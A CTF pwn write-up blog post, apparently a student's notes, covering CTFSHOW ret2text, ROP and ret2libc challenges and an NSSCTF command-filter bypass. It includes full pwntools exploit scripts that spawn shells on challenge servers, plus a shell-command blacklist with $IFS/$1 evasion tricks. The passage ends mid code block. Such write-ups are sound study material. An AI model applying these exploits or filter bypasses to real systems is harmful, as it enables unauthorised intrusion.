    <content type="html"><![CDATA[<h1 id="CTFSHOW"><a href="#CTFSHOW" class="headerlink" title="CTFSHOW"></a>CTFSHOW</h1><h2 id="pwn37-38-return-text"><a href="#pwn37-38-return-text" class="headerlink" title="pwn37&#x2F;38(return text)"></a>pwn37&#x2F;38(return text)</h2><blockquote><p>ret2text (Return-to-text&#x2F;Return-to-code): ret2text 是一种利用栈溢出等漏洞，将程序控制流导向程序本身的代码区域（text&#x2F;code segment）的技术。在许多程序中，代码区域是可执行的，因此攻击者可以通过改变程序执行流程，使其执行恶意的代码。一般情况下，攻击者会在栈上放置一个指向代码区域中恶意代码的地址，然后通过溢出等漏洞改变函数的返回地址，使程序跳转到恶意代码并执行.。 </p></blockquote><h3 id="查看内存常用命令"><a href="#查看内存常用命令" class="headerlink" title="查看内存常用命令"></a>查看内存常用命令</h3><blockquote><p>dq      x&#x2F;10xg       p&#x2F;x    telescope </p></blockquote><p>GDB测偏移</p><a class="simple-lightbox" href="/2023/07/24/Pwn_CTF/image-20230725170934385.png"><img   src="/images/loading.svg" data-src="/2023/07/24/Pwn_CTF/image-20230725170934385.png"  class="" lazyload></a><p>关于栈平衡的问题：如果正常的payload打不通，就在payload前面加一个ret的地址进行栈平衡，让继续执行下一个指令。</p><p>gdb调试system成功，rbp下面就是返回地址，可以通过gdb查看是否改写成功。</p><a class="simple-lightbox" href="/2023/07/24/Pwn_CTF/image-20230725184203864.png"><img   src="/images/loading.svg" data-src="/2023/07/24/Pwn_CTF/image-20230725184203864.png"  class="" lazyload></a><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">BINARY = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">elf = ELF(BINARY)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(BINARY)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28119</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>(<span class="params">s=<span class="string">&quot;&quot;</span></span>):</span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        gdb.attach(p, s)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">x, y</span>): <span class="keyword">return</span> log.success(<span class="string">f&#x27;<span class="subst">&#123;x&#125;</span>: <span class="subst">&#123;<span class="built_in">hex</span>(y)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x400657</span></span><br><span class="line">ret = <span class="number">0x40066D</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x0A</span> + <span class="number">8</span>) +p64(ret)+p64(backdoor)<span class="comment"># 放一个ret平衡栈，在rop链子的前面</span></span><br><span class="line"><span class="comment"># dbg()</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="pwn39（没有后门函数）"><a href="#pwn39（没有后门函数）" class="headerlink" title="pwn39（没有后门函数）"></a>pwn39（没有后门函数）</h2><ul><li><p>注意点：在32位置中plt后面默认跟的是返回地址，所以函数的plt和参数中间要给返回补充padding</p></li><li><p>更好的理解：调用一个函数的时候要对应一个返回地址；也就是说，如果在system之后夺得shell的话，那就不需要在添加返回地址了</p><blockquote><p>32：sys_plt + ret_addr + bin&#x2F;sh 必须添加</p><p>64：pop_rdi + bin&#x2F;sh + system +ret_addr 可加可不加</p></blockquote></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">BINARY = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">elf = ELF(BINARY)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(BINARY)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28134</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>(<span class="params">s=<span class="string">&quot;&quot;</span></span>):</span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        gdb.attach(p, s)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">x, y</span>): <span class="keyword">return</span> log.success(<span class="string">f&#x27;<span class="subst">&#123;x&#125;</span>: <span class="subst">&#123;<span class="built_in">hex</span>(y)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">binsh_addr = <span class="number">0x08048750</span></span><br><span class="line">system_plt = elf.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">lg(<span class="string">&#x27;system_addr&#x27;</span>,system_plt)</span><br><span class="line"><span class="comment"># 这里0也可以用ret来代替，补充plt的返回地址</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x12</span>+<span class="number">4</span>)+p32(system_plt)+p32(<span class="number">0</span>)+p32(binsh_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p.recvuntil(&#x27;Just easy ret2text&amp;&amp;32bit&#x27;)</span></span><br><span class="line">dbg()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="pwn40（没有后门函数，x64的寄存器传参顺序）"><a href="#pwn40（没有后门函数，x64的寄存器传参顺序）" class="headerlink" title="pwn40（没有后门函数，x64的寄存器传参顺序）"></a>pwn40（没有后门函数，x64的寄存器传参顺序）</h2><p>知识点传参顺序：</p><ol><li><strong>存器传参（Register Parameter Passing）</strong>：x64架构的计算机使用寄存器来传递一部分参数。通常情况下，前几个参数会被传递到特定的寄存器中，而不是存放在栈上。例如，对于Windows操作系统上的x64架构，前四个整数或指针参数（整数、指针、地址等）会被依次存放在寄存器<code>RCX</code>、<code>RDX</code>、<code>R8</code>和<code>R9</code>中。（还有一种说法：RDI, RSI, RDX, RCX, R8, R9）</li><li><strong>栈传参（Stack Parameter Passing）</strong>：如果函数参数的数量超过了寄存器的限制，额外的参数将存储在栈上。参数从右向左依次入栈，即后面的参数先入栈，前面的参数后入栈。在栈上传参时，可能会有对齐要求，保证栈上数据的对齐方式。</li><li><strong>返回值传递（Return Value Passing）</strong>：函数的返回值通常通过寄存器<code>RAX</code>来传递。整数和指针类型的返回值通常存储在<code>RAX</code>中，而浮点数返回值通常存储在<code>XMM0</code>寄存器中。</li></ol><p><strong>工具</strong>：ROPgadget –binary .&#x2F;file_name  –only “pop|ret” | grep reg</p><ul><li><p>关于如何区分32位和64位的参数payload的编写顺序：想两者函数调用的编写规则，然后给倒过来写即可：</p><blockquote><p>32：压入参数   压入返回地址   压入函数地址</p><p>64：寄存器传参数   压入返回地址   压入函数地址</p></blockquote></li></ul><p>栈平衡：在编程中，函数调用的栈平衡指的是在程序执行过程中，确保函数调用和返回的堆栈（通常称为调用栈或执行栈）的平衡</p><blockquote><p>栈平衡就是给加一个ret的地址作为跳板让其返回到下一个栈地址继续执行，作为一个填充长度，放在rop调用链之前或者调用函数之前，不能放到调用函数之后</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 正确写法</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x0A</span> + <span class="number">8</span>) + p64(ret)+ p64(pop_rdi) + p64(binsh) + p64(system) </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x0A</span> + <span class="number">8</span>) + p64(pop_rdi) + p64(binsh)+ p64(ret) + p64(system) </span><br><span class="line"><span class="comment"># 错误写法</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x0A</span> + <span class="number">8</span>) + p64(pop_rdi + p64(ret)) + p64(binsh) + p64(system) </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x0A</span> + <span class="number">8</span>) + p64(pop_rdi) + p64(binsh) + p64(system) + p64(ret)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># exp.py</span></span><br><span class="line">binsh = <span class="number">0x400808</span></span><br><span class="line">system = <span class="number">0x400520</span></span><br><span class="line">pop_rdi = <span class="number">0x4007e3</span></span><br><span class="line">system = elf.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">ret = <span class="number">0x4004fe</span> <span class="comment"># 0x00000000004004fe : ret</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x0A</span> + <span class="number">8</span>)   + p64(ret)+ p64(pop_rdi) + p64(binsh)+p64(system) </span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="pwn41-42-bin-sh使用sh代替"><a href="#pwn41-42-bin-sh使用sh代替" class="headerlink" title="pwn41&#x2F;42(&#x2F;bin&#x2F;sh使用sh代替)"></a>pwn41&#x2F;42(&#x2F;bin&#x2F;sh使用sh代替)</h2><ol><li>system(“&#x2F;bin&#x2F;sh”) ：<br>在Linux和类Unix系统中， &#x2F;bin&#x2F;sh 通常是一个符号链接，指向系统默认的shell程序（如Bash或Shell）。因此，使用system(“&#x2F;bin&#x2F;sh”) 会启动指定的shell程序，并在新的子进程中执行。这种方式可以确保使用系统默认的shell程序执行命令，因为&#x2F;bin&#x2F;sh 链接通常指向<br>默认shell的可执行文件。</li><li>system(“sh”) ：<br>使用system(“sh”) 会直接启动一个名为sh 的shell程序，并在新的子进程中执行。这种方式假设系统的环境变量$PATH 已经配置了能够找到sh 可执行文件的路径，否则可能会导致找不到sh 而执行失败。</li></ol><h2 id="pwn43-44（构造-bin-sh-gdb调试跟踪参数传递流程）"><a href="#pwn43-44（构造-bin-sh-gdb调试跟踪参数传递流程）" class="headerlink" title="pwn43&#x2F;44（构造&#x2F;bin&#x2F;sh,gdb调试跟踪参数传递流程）"></a>pwn43&#x2F;44（构造&#x2F;bin&#x2F;sh,gdb调试跟踪参数传递流程）</h2><p>知识点</p><ul><li>注意bss段的buf可以手动构造bin&#x2F;sh字符串作为参数传入。</li></ul><a class="simple-lightbox" href="/2023/07/24/Pwn_CTF/image-20230728173933897.png"><img   src="/images/loading.svg" data-src="/2023/07/24/Pwn_CTF/image-20230728173933897.png"  class="" lazyload></a><ul><li>gets函数没有输入的长度限制，可以一直输入直至回车键</li><li>如果read这种有输入长度限制但是不够rop链的，可以进行栈迁移</li></ul><p>注意，这里的一个问题困扰了很久：一个简单的ROP链是可以用GDB进行调试的，那复杂的怎么办呢？</p><p>这里和同学进行了请教，然后对wp的看似简单的rop链进行分析，这里需要注意个几个点：</p><ol><li>每一个函数调用在32位里面都需要跟一个返回地址，这里gets的返回地址是pop_ebx，system的返回地址是aaaa，main函数的返回地址是gets，因为如果你后面rop链要继续调用的话，函数调用为了完整性返回地址、参数必须完整</li><li>这段rop链子的调用过程概述：通过返回地址到gets读取参数buf2的参数（通过sendline传送的&#x2F;bin&#x2F;sh）然后通过pop将buf2存入ebx，然后system调用参数buf2中的bin&#x2F;sh从而夺权</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = cyclic(<span class="number">0x6c</span>+<span class="number">4</span>) + p32(gets) + p32(pop_ebx) + p32(buf2) + p32(system) + <span class="string">b&#x27;aaaa&#x27;</span> + p32(buf2)</span><br></pre></td></tr></table></figure><ol start="3"><li><p>完整代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 32位</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment"># io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28169)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">system = elf.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">buf2 = <span class="number">0x804B060</span></span><br><span class="line">gets = elf.sym[<span class="string">&#x27;gets&#x27;</span>]</span><br><span class="line">pop_ebx = <span class="number">0x8048409</span> <span class="comment"># 0x08048409 : pop ebx ; ret</span></span><br><span class="line">payload = cyclic(<span class="number">0x6c</span>+<span class="number">4</span>) + p32(gets) + p32(pop_ebx) + p32(buf2) + p32(system) + <span class="string">b&#x27;aaaa&#x27;</span> + p32(buf2)</span><br><span class="line">gdb.attach(io)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">io.recv()</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 64位</span></span><br><span class="line">system = elf.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">gets = elf.symbols[<span class="string">&#x27;gets&#x27;</span>]</span><br><span class="line">buf2 = <span class="number">0x602080</span></span><br><span class="line">pop_rdi = <span class="number">0x4007f3</span> <span class="comment"># pop rdi ; ret</span></span><br><span class="line">ret = <span class="number">0x4004fe</span> <span class="comment"># 0x00000000004004fe : ret</span></span><br><span class="line"><span class="comment"># ret栈对齐是0x10 加单数个理论上</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xA</span>+<span class="number">8</span>)  + p64(pop_rdi) + p64(buf2) + p64(gets) + p64(pop_rdi) + p64(buf2) + p64(system) </span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></li><li><p>gdb的调试过程：通过查看内存变量观察函数的调用过程    通过观察主函数的返回地址观察函数调用过程</p><ol><li><p>先通过finish运行到主函数内部进行查看</p><a class="simple-lightbox" href="/2023/07/24/Pwn_CTF/image-20230731224725259.png"><img   src="/images/loading.svg" data-src="/2023/07/24/Pwn_CTF/image-20230731224725259.png"  class="" lazyload></a></li><li><p>然后发现主函数返回到gets函数</p><a class="simple-lightbox" href="/2023/07/24/Pwn_CTF/image-20230731224947918.png"><img   src="/images/loading.svg" data-src="/2023/07/24/Pwn_CTF/image-20230731224947918.png"  class="" lazyload></a></li><li><p>查看gets的系统调用执行</p><a class="simple-lightbox" href="/2023/07/24/Pwn_CTF/image-20230731225224295.png"><img   src="/images/loading.svg" data-src="/2023/07/24/Pwn_CTF/image-20230731225224295.png"  class="" lazyload></a></li><li><p>通过finish查看gets的返回地址是pop ebx 然后ret到system执行，在这里只是pop  ebx只是作为一个跳板，只是为了返回到system地址进行getshell而已</p><a class="simple-lightbox" href="/2023/07/24/Pwn_CTF/image-20230731225354257.png"><img   src="/images/loading.svg" data-src="/2023/07/24/Pwn_CTF/image-20230731225354257.png"  class="" lazyload></a></li><li><p>发现一致</p><a class="simple-lightbox" href="/2023/07/24/Pwn_CTF/image-20230731225807535.png"><img   src="/images/loading.svg" data-src="/2023/07/24/Pwn_CTF/image-20230731225807535.png"  class="" lazyload></a></li><li><p>这里还有一个简单的思路：通过覆盖gets的返回地址为system，然后让system的返回地址为buf2同时作为gets的参数也可以getshell，这个原理就是每个函数调用的参数返回地址等，与其他函数的调用无关。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = cyclic(<span class="number">0x6c</span>+<span class="number">4</span>) + p32(gets) + p32(system) + p32(buf2)+ p32(buf2)</span><br></pre></td></tr></table></figure></li></ol></li></ol><h2 id="pwn45-46-got表泄露-ret2libc"><a href="#pwn45-46-got表泄露-ret2libc" class="headerlink" title="pwn45&#x2F;46(got表泄露) ret2libc"></a>pwn45&#x2F;46(got表泄露) ret2libc</h2><blockquote><p> 特征：没有system  没有bin&#x2F;sh</p><p>那么如何得到 libc 中的某个函数的地址呢？我们一般常用的方法是采用 got 表泄露，即输出某个函数对应的 got 表项的内容。当然，由于 libc 的延迟绑定机制，我们需要泄漏已经执行过的函数的地址。这里注意要对泄露的函数原型进行查看，对payload要完成传参。</p><p>在得到 libc 之后，其实 libc 中也是有 &#x2F;bin&#x2F;sh 字符串的，所以我们可以一起获得 &#x2F;bin&#x2F;sh 字符串的地址。</p></blockquote><h4 id="puts泄露"><a href="#puts泄露" class="headerlink" title="puts泄露"></a>puts泄露</h4><p>这里注意接收的形式：直到xf7取从最后到倒数接收四个字节就是地址（这里后面没有0所以要截断四个字节，倒着接收是因为小段序）<a class="simple-lightbox" href="/2023/07/24/Pwn_CTF/image-20230731145442576.png"><img   src="/images/loading.svg" data-src="/2023/07/24/Pwn_CTF/image-20230731145442576.png"  class="" lazyload></a></p><p>查询libc偏移和版本的网站：<a href="https://libc.blukat.me/">libc database search (blukat.me)</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 32位</span></span><br><span class="line">puts_plt = elf.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">write_plt = elf.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_plt = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">ret = <span class="number">0x08048356</span></span><br><span class="line">lg(<span class="string">&#x27;puts plt&#x27;</span>, puts_plt)</span><br><span class="line">lg(<span class="string">&#x27;write plt&#x27;</span>, write_plt)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过打印获得puts的地址</span></span><br><span class="line"><span class="comment"># read 0xC8</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x6b</span> + <span class="number">4</span>)  </span><br><span class="line"><span class="comment"># 这里的返回地址写成main函数可以让这个payload执行完毕之后，再一次进行溢出</span></span><br><span class="line">payload += p32(puts_plt) + p32(main_plt) + p32(puts_got)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;O.o?&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment"># 因为小端序 倒取四个字节</span></span><br><span class="line">puts_addr = u32(p.recvuntil(<span class="string">&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])</span><br><span class="line">lg(<span class="string">&#x27;puts_addr&#x27;</span>, puts_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过puts的地址获取libc的地址</span></span><br><span class="line"><span class="comment"># puts_addr = 0xf7d6b360</span></span><br><span class="line">libc_base = puts_addr - <span class="number">0x067360</span></span><br><span class="line">system_plt = libc_base + <span class="number">0x03cd10</span></span><br><span class="line">binsh =  libc_base + <span class="number">0x17b8cf</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x6b</span> + <span class="number">4</span>) </span><br><span class="line">payload += p32(system_plt) + p32(<span class="number">0</span>) + p32(binsh)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;O.o?&#x27;</span>)</span><br><span class="line">dbg()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 64位</span></span><br></pre></td></tr></table></figure><p>这里的接收的&#x2F;x7f，因为libc的地址是六位，前两位是00不显示。又因为接收的的字节，所以用u64解包，并且高位用00补全八位</p><blockquote><p>0x 7f ff f7 e1 50 00<br>puts_addr &#x3D; p.recvuntil(‘\x7f’)[-6:].ljust(8,’\x00’）</p><a class="simple-lightbox" href="/2023/07/24/Pwn_CTF/image-20230731173353357.png"><img   src="/images/loading.svg" data-src="/2023/07/24/Pwn_CTF/image-20230731173353357.png"  class="" lazyload></a><p>puts_addr &#x3D; u64(p.recvuntil(‘\x7f’)[-6:].ljust(8,b’\x00’))</p><a class="simple-lightbox" href="/2023/07/24/Pwn_CTF/image-20230731173459832.png"><img   src="/images/loading.svg" data-src="/2023/07/24/Pwn_CTF/image-20230731173459832.png"  class="" lazyload></a></blockquote><a class="simple-lightbox" href="/2023/07/24/Pwn_CTF/image-20230731172534065.png"><img   src="/images/loading.svg" data-src="/2023/07/24/Pwn_CTF/image-20230731172534065.png"  class="" lazyload></a><h4 id="write泄露"><a href="#write泄露" class="headerlink" title="write泄露"></a>write泄露</h4><a class="simple-lightbox" href="/2023/07/24/Pwn_CTF/image-20230801164558925.png"><img   src="/images/loading.svg" data-src="/2023/07/24/Pwn_CTF/image-20230801164558925.png"  class="" lazyload></a><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x70</span>+<span class="number">8</span>) + p64(pop_rdi) + p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rsi_r15) + p64(write_got) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(write_plt)</span><br><span class="line">payload += p64(main)</span><br></pre></td></tr></table></figure><p><strong>注意：</strong>这里有一个注意的点，p64(pop_rsi_r15)这个点，对于write这个函数的参数只有三个参数：</p><ul><li>fd：文件描述符，这里就是1</li><li>buf：需要传入的字符串</li><li>count：每次写入的字节数</li></ul><p>但是看看gadget，只能控制rdi和rsi，r15不能控制，这种情况一般是没有用的padding给填充位置，或者没办法控制。</p><a class="simple-lightbox" href="/2023/07/24/Pwn_CTF/image-20230801211525162.png"><img   src="/images/loading.svg" data-src="/2023/07/24/Pwn_CTF/image-20230801211525162.png"  class="" lazyload></a><h1 id="NSSCTF"><a href="#NSSCTF" class="headerlink" title="NSSCTF"></a>NSSCTF</h1><h2 id="SWPUCTF-2021-新生赛-nc签到（字符串过滤）"><a href="#SWPUCTF-2021-新生赛-nc签到（字符串过滤）" class="headerlink" title="[SWPUCTF 2021 新生赛]nc签到（字符串过滤）"></a>[SWPUCTF 2021 新生赛]nc签到（字符串过滤）</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">blacklist = [<span class="string">&#x27;cat&#x27;</span>,<span class="string">&#x27;ls&#x27;</span>,<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;cd&#x27;</span>,<span class="string">&#x27;echo&#x27;</span>,<span class="string">&#x27;&lt;&#x27;</span>,<span class="string">&#x27;$&#123;IFS&#125;&#x27;</span>]</span><br></pre></td></tr></table></figure><p>这里的${IFS}加大括号的原因是这样的</p><blockquote><p>在Unix和Unix-like系统（包括Linux）的shell中，<code>$&#123;IFS&#125;</code>使用大括号的形式是为了明确地指定一个环境变量。大括号在这里的作用是告诉shell，<code>$&#123;IFS&#125;</code>是一个环境变量的名称，而不是一个常规的字符串。</p><p><code>$&#123;IFS&#125;</code>中的<code>IFS</code>是一个特殊的环境变量，表示”Internal Field Separator”（内部字段分隔符）。它用于定义用于分隔单词和字段的字符，默认情况下包含空格、制表符和换行符。</p><p>在大括号内使用<code>$&#123;IFS&#125;</code>是一种良好的编程实践，尤其是在以下情况下：</p><ol><li>当需要将环境变量放在复杂的表达式中，以确保shell正确识别变量的边界。</li><li>当环境变量名后面跟着其他字符时，用大括号来明确指定变量的范围。</li></ol><p>例如，<code>$&#123;IFS&#125;abc</code>将会将<code>IFS</code>与<code>abc</code>拼接在一起，以生成一个新的字符串，而不是将<code>IFS</code>视为一个完整的变量名。</p><p>总之，使用大括号<code>$&#123;&#125;</code>来引用环境变量是一种良好的编程习惯，可以避免因变量名与其他字符混淆而引发错误。但在<code>$&#123;IFS&#125;</code>这个特定的例子中，如果<code>IFS</code>后面没有紧跟其他字符，大括号并不是必需的。所以在<code>$&#123;IFS&#125;</code>和<code>$IFS</code>之间没有实际的差异。</p></blockquote><p>但是，这里的字符串过滤中过滤掉了{IFS}，所以我们只能用空字符将其和后面的字符进行截断，这里使用的是$1,<code>$1</code>表示脚本或函数的第一个位置参数，为什么用这个呢？请看：</p><blockquote><p>如果没有传递任何参数给脚本，那么<code>$1</code>将为空。在这种情况下，<code>echo $1</code>将只打印出一个空行</p></blockquote><p>所以可以准确得出这里的$1可以将字符串进行截断，然后使用$IFS告诉终端这是一个环境变量代表的是空格，从而进行输出。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span 